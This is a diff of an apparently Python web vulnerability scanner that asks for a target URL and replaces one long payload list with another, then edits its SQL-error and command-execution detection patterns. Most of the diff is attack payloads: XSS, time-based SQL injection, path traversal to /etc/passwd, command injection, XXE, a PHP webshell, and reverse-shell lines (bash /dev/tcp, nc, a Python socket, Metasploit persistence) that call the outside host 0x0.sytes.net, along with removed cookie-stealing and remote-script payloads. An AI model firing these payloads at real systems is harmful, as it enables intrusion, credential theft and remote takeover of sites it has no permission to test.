@@ -28,9 +28,7 @@ from bs4 import MarkupResemblesLocatorWarning
 
 def get_target_url():
     while True:
-        user_input = input(
-            "Enter the target URL (e.g., https://example.com): "
-        )
+        user_input = input("Enter the target URL (e.g., https://example.com): ")
 
         if not re.match(r"https?://", user_input):
             user_input = "http://" + user_input
@@ -62,167 +60,255 @@ def get_target_url():
             init(autoreset=True)
 
 
-payloads = [
-    "<script>alert('AliElTop')</script>",
-    ";phpinfo()",
-    "<script>alert('AliElTop')</script>%0Dalert`1`//",
-    "<script>alert('AliElTop')</script>0D%",
-    '\';alert("AliElTop")%0D//',
-    "'<svg/onload=alert('AliElTop')>",
-    '\';alert("AliElTop")%0Dalert`1`//',
-    "+OR+1=1--",
-    "administrator'--",
-    "admin'--",
-    "+UNION+SELECT+BANNER,+NULL+FROM+v$version--",
-    "+UNION+SELECT+'abc','def'#",
-    "+UNION+SELECT+@@version,+NULL#",
-    "|ls -la",
-    "sample@email.tst<esi:include src=\\http://0x0.sytes.net/xss.svg\\/>",
+PAYLOADS = [
+    "<img+src%3dOnXSS+OnError%3dalert('AliElTop')>",
+    "'; SELECT * FROM users; --",
+    "<script>alert('AliElTop');</script>",
+    "><svg/onload=prompt(/AliElTop/)>",
+    "/cgi-bin/rr.cgi/https://www.google.com/",
+    "<svg/onload=prompt(/AliElTop/)>",
+    "../../../../../../../../../../../../../../windows/win.ini",
+    ";alert(md5('AliElTop'))",
     "{% For c in [1,2,3]%} {{c,c,c}} {% endfor %}",
     "{{4*4}}[[5*5]]",
-    "<=script>=alert(\\AliElTop\\)<=/scirpt>=",
-    "-1\\ OR 2+199-199-1=0+0+0+1 --",
-    "if(now()=sysdate(),sleep(15),0)",
-    "0\\XOR(if(now()=sysdate(),sleep(15),0))XOR\\\\",
+    "%26ls||id%26",
+    "AliElTop",
+    "gh1tpn7ip68xi45lg48197t9107rvhj6.oastify.com",
+    "â€œ><script>alert(document.domain)</script>",
+    ")'<!--><Svg OnLoad=(confirm)(13337777)<!--",
+    ">'-(k=alert,k(13337777))-'",
+    "<form><button formaction=javascript&colon;alert(13337777)",
+    "-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+    "if(now()=sysdate(),sleep(20),0)",
     "${@print(md5(31337))}",
-    "<Svg Only=1 OnLoad=confirm(atob(\\Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\\))>",
-    "../../../../../../../../../../../../../../windows/win.ini",
+    "'(select*from(select(sleep(20)))a)'",
+    "_next/image?url=",
+    "'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'",
+    "%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1",
     "../../../../../../../../../../../../../../etc/passwd",
-    "\\+response.write(9776594*9852164)+\\\\",
     "sh -i 5<> /dev/tcp/0x0.sytes.net/4444 0<&5 1>&5 2>&5",
     "run persistence -U -i 5 -p 4444 -r 0x0.sytes.net",
     "nc 0x0.sytes.net 4444 -e /bin/sh",
-    "///;@0x0.sytes.net",
-    "//;@google.com",
-    "<script>alert(document.domain)</script>",
-    "<form><button formaction=javascript&colon;alert(1)",
-    "<script>prompt(1)</script>@gmail.com",
-    "%3Cscript%3Ealert(%27AliElTop%27)%3C/script%3E",
-    "<svg/onload=alert(\\AliElTop\\)>",
-    "\\74img src=x onerror=alert()\\76",
-    "#\\><img src=/ onerror=alert(1)>",
-    "<style><style /><img src=x onerror=alert(1)>",
-    "<img alt=\\<x\\ title=\\/><img src=x onerror=alert(1)\\>",
-    "‘ or 1=1 —",
-    "' or 1=1 —",
-    "test’ OR 1=1;–.",
-    (
-        "python -c \\import socket; s=socket.socket(); s.connect(('0x0.sytes.net',"
-        " 4444))\\"
-    ),
-    "<svg/onload=alert(AliElTop)>//INJECTX",
-    "<svg xmlns=\\http://0x0.sytes.net/xss.svg\\ onload=\\alert(document.domain)\\/>",
-    "<script>alert(AliElTop)</script>!–INJECT",
-    "“><script>alert(document.domain)</script>",
-    "http://0x0.sytes.net/xss.svg",
-    "Max-Age: 99999999",
-    "https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999",
-    "<iframe/onload=src=top.name>",
-    "javascript://%0aalert(1)",
-    "\\> <script src=\\https://js.rip/8dis0rxh46\\></script>",
-    (
-        "javascript:eval('var"
-        " a=document.createElement(\\'script\\');a.src=\\'https://js.rip/8dis0rxh46\\';document.body.appendChild(a)')"
-    ),
-    (
-        "\\><input onfocus=eval(atob(this.id))"
-        " id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzhkaXMwcnhoNDYiO2RvY3UvZW1tZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7"
-        " autofocus>"
-    ),
-    (
-        "\\><img src=x"
-        " id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzhkaXMwcnhoNDYiO2RvY3UvZW1tZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7"
-        " onerror=eval(atob(this.id))>"
-    ),
-    (
-        "\\><video><source onerror=eval(atob(this.id))"
-        " id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzhkaXMwcnhoNDYiO2RvY3UvZW1tZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>"
-    ),
-    (
-        "\\><iframe"
-        " srcdoc=\\&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/8dis0rxh46&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\\>"
-    ),
-    (
-        "<script>function b(){eval(this.responseText)};a=new"
-        " XMLHttpRequest();a.addEventListener(\\load\\ b);a.open(\\GET\\"
-        " \\https://js.rip/8dis0rxh46\\);a.send();</script>"
-    ),
-    "<script>$.getScript(\\https://js.rip/8dis0rxh46\\)</script>",
-    "<iframe src=javascript:alert()>",
-    "<img src=\\x\\ onerror=\\alert('AliElTop')\\>",
-    "X-Forwarded-Host:\<script>alert('AliElTop')</script>",
-    "X-Forwarded-For:\<script>alert('AliElTop')</script>",
-    "X-Forwarded-Host: a.\\><script>alert(1)</script>\\",
-    "X-Forwarded-Proto: \<script>alert('AliElTop')</script>",
-    "X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//",
-    "X-Forwarded-For: > ;whoami",
-    "Cookie: gdId=xss</script%20",
-    "\\><img src=\\AliElTop\\>",
-    (
-        "&#x22;&#x20;> <script>&#x0a;fetch(‘http://0x0.sytes.net/', { method: ‘POST’,"
-        " mode: ‘no-cors’, body:document.cookie });&#x0a;</script>&#x20;&#x22;"
-    ),
-    "<a href=\\javascript:alert('AliElTop')\\>Click me</a>",
-    "&lt;script&gt;alert('AliElTop')&lt;/script&gt;",
-    "<img src=x onload=alert(AliElTop)>",
-    "<img alt=\\<AliElTop\\ title=\\/\\><img src=x onerror=alert(AliElTop)>",
-    "<img alt=\\<x\\ title=\\<?php echo($_GET['value']); ?>\\>",
-    (
-        "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY"
-        " ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>"
-    ),
+    "onmouseover=alert('AliElTop')",
+    "0x0.sytes.net:4444",
+    "http://0x0.sytes.net:4444",
+    "confirm('AliElTop')",
+    "http://0x0.sytes.net/ali1.svg",
+    "{{['id']|filter('system')}}",
+    "javascript:alert(1)",
+    ";@include('http://0x0.sytes.net/ali1.svg')",
+    "javascript:eval('var a=document.createElement('script');a.src='https://js.rip/8dis0rxh46';document.body.appendChild(a)')",
+    "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
     "webshell.php",
     "admin' OR '1'='1",
-    (
-        "\\<img src=\\0x0.sytes.net\\"
-        " onload=window.open(\\0x0.sytes.net\\\\xss\\'height=500,width=500');>"
-    ),
     "../../../../etc/passwd%00",
-    "\\<img src=x onerror=alert('AliElTop')>",
-    "\\<img src=x onload=alert('AliElTop')>",
-    "\\<?php system($_GET['cmd']); ?>",
+    "<img src=x onerror=alert('AliElTop')>",
+    "<img src=x onload=alert('AliElTop')>",
+    "<iframe src=x onerror=prompt(13337777)>",
+    "<iframe src=x onerror=confirm(13337777)>",
+    "<iframe src=x onerror=alert(13337777)>",
+    "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
-    "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGhxPnRlc3Q8L2hxPgo=",
-    "evil_script.js",
+    "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
     ";ls",
     "ls",
-    "admin.php",
-    "+9739343777;phone-context=<script>alert(AliElTop)</script>",
-    "+91 97xxxx7x7;ext=1;ext=2",
-    "+91 97xxxx7x7;phone-context=' OR 1=1; -",
-    "+91 97xxxx7x7;phone-context={{4*4}}{{5+5}}",
-    "robots.txt",
-    "\\-prompt(8)\\-\\",
-    "'-prompt(8)-'",
-    "\\;a=prompt,a()//",
-    "';a=prompt,a()//",
-    "'-eval(\\window['pro'%2B'mpt'](8)\\)-'",
-    "\\-eval(\\window['pro'%2B'mpt'](8)\\)-\\",
-    "\\onclick=prompt(8)>\\@x.y",
-    "\\onclick=prompt(8)><svg/onload=prompt(8)>\\@x.y",
-    "<image/src/onerror=prompt(8)>",
-    "<img/src/onerror=prompt(8)>",
-    "<image src/onerror=prompt(8)>",
-    "<img src/onerror=prompt(8)>",
-    "<image src =q onerror=prompt(8)>",
-    "<img src =q onerror=prompt(8)>",
-    "</scrip</script>t><img src =q onerror=prompt(8)>",
-    "<script\\x20type=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x3Etype=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x0Dtype=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x09type=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x0Ctype=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x2Ftype=\\text/javascript\\>javascript:alert(1);</script>",
-    "<script\\x0Atype=\\text/javascript\\>javascript:alert(1);</script>",
-    "'`\\><\\\\x3Cscript>javascript:alert(1)</script>",
-    "'`\\><\\\\x00script>javascript:alert(1)</script>",
-    "<img src=1 href=1 onerror=\\javascript:alert(1)\\></img>",
-    "<audio src=1 href=1 onerror=\\javascript:alert(1)\\></audio>",
-    "<video src=1 href=1 onerror=\\javascript:alert(1)\\></video>",
-    "<body src=1 href=1 onerror=\\javascript:alert(1)\\></body>",
-    "<image src=1 href=1 onerror=\\javascript:alert(1)\\></image>",
-    "<object src=1 href=1 onerror=\\javascript:alert(1)\\></object>",
-    "<script src=1 href=1 onerror=\\javascript:alert(1)\\></script>",
+    "<image/src/onerror=alert('AliElTop')>",
+    "<img/src/onerror=alert('AliElTop')>",
+    "<image src/onerror=alert('AliElTop')>",
+    "<img src/onerror=alert('AliElTop')>",
+    "<image src =q onerror=alert('AliElTop')>",
+    "<img src =q onerror=alert('AliElTop')>",
+    "</scrip</script>t><img src =q onerror=alert('AliElTop')>",
+    "..//etc/passwd",
+    "../..//etc/passwd",
+    "../../..//etc/passwd",
+    "../../../..//etc/passwd",
+    "../../../../..//etc/passwd",
+    "../../../../../..//etc/passwd",
+    "../../../../../../..//etc/passwd",
+    "../../../../../../../..//etc/passwd",
+    "..%2f/etc/passwd",
+    "..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+    "%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+    "%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
+    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;",
+    "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
+    "/index.html|id|",
+    ";id;",
+    ";id",
+    ";netstat -a;",
+    ";system('cat%20/etc/passwd')",
+    "|id",
+    "|/usr/bin/id",
+    "|id|",
+    "|/usr/bin/id|",
+    "||/usr/bin/id|",
+    "|id;",
+    "||/usr/bin/id;",
+    ";id|",
+    ";|/usr/bin/id|",
+    "\n/bin/ls -al\n \n",
+    "\n/usr/bin/id\n \n",
+    "\nid\n \n",
+    "\n/usr/bin/id;",
+    "\nid;",
+    "\n/usr/bin/id|",
+    "\nid|",
+    ";/usr/bin/id\n \n",
+    ";id\n \n",
+    "|usr/bin/id\n \n",
+    "|nid\n \n",
+    "`id`",
+    "`/usr/bin/id`",
+    "a);id",
+    "a;id",
+    "a);id;",
+    "a;id;",
+    "a);id|",
+    "a;id|",
+    "a)|id",
+    "a|id",
+    "a)|id;",
+    "|/bin/ls -al",
+    "a);/usr/bin/id",
+    "a;/usr/bin/id",
+    "a);/usr/bin/id;",
+    "a;/usr/bin/id;",
+    "a);/usr/bin/id|",
+    "a;/usr/bin/id|",
+    "a)|/usr/bin/id",
+    "a|/usr/bin/id",
+    "a)|/usr/bin/id;",
+    ";system('id')",
+    ";system('/usr/bin/id')",
+    "%0Acat%20/etc/passwd",
+    "%0A/usr/bin/id",
+    "%0Aid",
+    "%0A/usr/bin/id%0A",
+    "%0Aid%0A",
+    "| id",
+    "& id",
+    "; id",
+    "%0a id %0a",
+    "$;/usr/bin/id",
+    "cat /etc/hosts",
+    "$(`cat /etc/passwd`)",
+    "cat /etc/passwd",
+    "system('cat /etc/passwd');",
+    "# from wapiti",
+    "sleep(20)#",
+    "1 or sleep(20)#",
+    " or sleep(20)#",
+    "' or sleep(20)#",
+    " or sleep(20)=",
+    "' or sleep(20)='",
+    "1) or sleep(20)#",
+    ") or sleep(20)=",
+    "') or sleep(20)='",
+    "1)) or sleep(20)#",
+    ")) or sleep(20)=",
+    "')) or sleep(20)='",
+    ";waitfor delay '0:0:20'--",
+    ");waitfor delay '0:0:20'--",
+    "';waitfor delay '0:0:20'--",
+    ";waitfor delay '0:0:20'--",
+    "');waitfor delay '0:0:20'--",
+    ");waitfor delay '0:0:20'--",
+    "));waitfor delay '0:0:20'--",
+    "'));waitfor delay '0:0:20'--",
+    "));waitfor delay '0:0:20'--",
+    "benchmark(10000000,MD5(20))#",
+    "1 or benchmark(10000000,MD5(20))#",
+    " or benchmark(10000000,MD5(20))#",
+    "' or benchmark(10000000,MD5(20))#",
+    "1) or benchmark(10000000,MD5(20))#",
+    ") or benchmark(10000000,MD5(20))#",
+    "') or benchmark(10000000,MD5(20))#",
+    "1)) or benchmark(10000000,MD5(20))#",
+    ")) or benchmark(10000000,MD5(20))#",
+    "')) or benchmark(10000000,MD5(20))#",
+    "pg_sleep(20)--",
+    "1 or pg_sleep(20)--",
+    " or pg_sleep(20)--",
+    "' or pg_sleep(20)--",
+    "1) or pg_sleep(20)--",
+    ") or pg_sleep(20)--",
+    "') or pg_sleep(20)--",
+    "1)) or pg_sleep(20)--",
+    ")) or pg_sleep(20)--",
+    "')) or pg_sleep(20)--",
+    "AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe",
+    "AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='",
+    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)",
+    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--",
+    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#",
+    "SLEEP(20)#",
+    "SLEEP(20)--",
+    "SLEEP(20)=",
+    "SLEEP(20)='",
+    "or SLEEP(20)",
+    "or SLEEP(20)#",
+    "or SLEEP(20)--",
+    "or SLEEP(20)=",
+    "or SLEEP(20)='",
+    "waitfor delay '00:00:20'",
+    "waitfor delay '00:00:20'--",
+    "waitfor delay '00:00:20'#",
+    "benchmark(50000000,MD5(20))",
+    "benchmark(50000000,MD5(20))--",
+    "benchmark(50000000,MD5(20))#",
+    "or benchmark(50000000,MD5(20))",
+    "or benchmark(50000000,MD5(20))--",
+    "or benchmark(50000000,MD5(20))#",
+    "pg_SLEEP(20)",
+    "pg_SLEEP(20)--",
+    "pg_SLEEP(20)#",
+    "or pg_SLEEP(20)",
+    "or pg_SLEEP(20)--",
+    "or pg_SLEEP(20)#",
+    "AnD SLEEP(20)",
+    "AnD SLEEP(20)--",
+    "AnD SLEEP(20)#",
+    "&&SLEEP(20)",
+    "&&SLEEP(20)--",
+    "&&SLEEP(20)#",
+    "' AnD SLEEP(20) ANd '1",
+    "'&&SLEEP(20)&&'1",
+    "ORDER BY SLEEP(20)",
+    "ORDER BY SLEEP(20)--",
+    "ORDER BY SLEEP(20)#",
+    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)",
+    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)#",
+    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)--",
+    "+benchmark(3200,SHA1(20))+'",
+    "+ SLEEP(20) + '",
+    "RANDOMBLOB(500000000/2)",
+    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+    "RANDOMBLOB(1000000000/2)",
+    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
 ]
 
 USER_AGENTS = [
@@ -486,12 +572,10 @@ def check_sqli(url):
             r"java\.sql\.SQLException: ORA-02291",
             r"SQLSTATE\[HY000\]: General error: 1366",
             r"ERROR: column \".*\" does not exist",
-            r"ERROR: syntax error at or near \".*\"",
             r"java\.lang\.NoSuchMethodError",
             r"SQLSTATE\[08006\]: No connection to the server",
             r"java\.sql\.SQLException: ORA-02292",
             r"SQLSTATE\[23502\]: Not null violation",
-            r"ERROR: syntax error at or near \"[^\"]+\"",
             r"java\.sql\.SQLException: No value specified",
             r"ERROR: relation \".*\" already exists at character",
             r"ORA-02292",
@@ -523,7 +607,6 @@ def check_sqli(url):
             r"SQLSTATE\[HY000\]: General error: 1360",
             r"ERROR: column \".*\" of relation \".*\" does not exist",
             r"ERROR: duplicate key value violates unique constraint",
-            r"ERROR: invalid byte sequence for encoding \"UTF8\"",
             r"SQLSTATE\[08006\]: No connection to the server:",
             r"ERROR: column \".*\" of relation \".*\" does not exist at character",
             r"java\.sql\.SQLException: No data found",
@@ -534,7 +617,6 @@ def check_sqli(url):
             r"SQLSTATE\[HY000\]: General error: 1021",
             r"ERROR: duplicate key violates unique constraint",
             r"java\.sql\.SQLException: No results were returned",
-            r"ERROR: unterminated quoted string at or near \".*\"",
             r"java\.sql\.SQLException: ORA-00904",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
             r"ERROR: relation \".*\" does not exist LINE",
@@ -569,15 +651,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -617,15 +690,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -665,15 +729,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -713,15 +768,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -761,15 +807,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -809,15 +846,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -857,15 +885,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -905,15 +924,6 @@ def check_sqli(url):
             r"ERROR: column \".*\" specified more than once at character.*LINE",
             r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
             r"java\.lang\.ClassCastException:.*LINE",
-            (
-                r"ERROR: current transaction is aborted, commands ignored until end of"
-                r" transaction block.*LINE"
-            ),
-            r"SQLSTATE\[HY000\]: General error: 1360",
-            (
-                r"ERROR: column \".*\" of relation \".*\" does not exist at"
-                r" character.*LINE"
-            ),
             r"ERROR: duplicate key value violates unique constraint.*LINE",
             r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
             r"SQLSTATE\[08006\]: No connection to the server:",
@@ -941,43 +951,51 @@ def check_rce(url):
         response.raise_for_status()
 
         rce_patterns = [
-            r"ERROR: Command execution",
-            r"System\.Exec",
-            r"exec\(",
-            r"passthru\(",
-            r"shell_exec\(",
-            r"popen\(",
-            r"proc_open\(",
-            r"eval\(",
-            r"assert\(",
-            r"java\.lang\.Runtime\.getRuntime\(\)\.exec\(",
-            r"java\.lang\.ProcessBuilder\.start\(",
-            r"os\.system\(",
-            r"subprocess\.Popen\(",
-            r"subprocess\.call\(",
-            r"subprocess\.check_output\(",
-            r"subprocess\.check_call\(",
-            r"Runtime\.getRuntime\(\)\.exec\(",
-            r"exec\(\$_(GET|POST|REQUEST)",
-            r"assert\(\$_(GET|POST|REQUEST)",
-            r"shell_exec\(\$_(GET|POST|REQUEST)",
-            r"passthru\(\$_(GET|POST|REQUEST)",
-            r"popen\(\$_(GET|POST|REQUEST)",
-            r"proc_open\(\$_(GET|POST|REQUEST)",
-            r"eval\(\$_(GET|POST|REQUEST)",
-            r"system\(\$_(GET|POST|REQUEST)",
-            r"System\.Exec\(\$_(GET|POST|REQUEST)",
-            r"os\.system\(\$_(GET|POST|REQUEST)",
+            r"\bERROR: Command execution\b",
+            r"\bSystem\.Exec\b",
+            r"\bexec\(",
+            r"\bpassthru\(",
+            r"\bshell_exec\(",
+            r"\bpopen\(",
+            r"\bproc_open\(",
+            r"\beval\(",
+            r"\bassert\(",
+            r"\bjava\.lang\.Runtime\.getRuntime\(\)\.exec\(",
+            r"\bjava\.lang\.ProcessBuilder\.start\(",
+            r"\bos\.system\(",
+            r"\bsubprocess\.Popen\(",
+            r"\bsubprocess\.call\(",
+            r"\bsubprocess\.check_output\(",
+            r"\bbash:",
+            r"\bBash:",
+            r"\bwww-data",
+            r"\broot:",
+            r"\bsubprocess\.check_call\(",
+            r"\bRuntime\.getRuntime\(\)\.exec\(",
+            r"\bexec\(\$_(GET|POST|REQUEST)",
+            r"\bassert\(\$_(GET|POST|REQUEST)",
+            r"\bshell_exec\(\$_(GET|POST|REQUEST)",
+            r"\bpassthru\(\$_(GET|POST|REQUEST)",
+            r"\bpopen\(\$_(GET|POST|REQUEST)",
+            r"\bproc_open\(\$_(GET|POST|REQUEST)",
+            r"\beval\(\$_(GET|POST|REQUEST)",
+            r"\bsystem\(\$_(GET|POST|REQUEST)",
+            r"\bSystem\.Exec\(\$_(GET|POST|REQUEST)",
+            r"\bos\.system\(\$_(GET|POST|REQUEST)",
         ]
 
-        for pattern in rce_patterns:
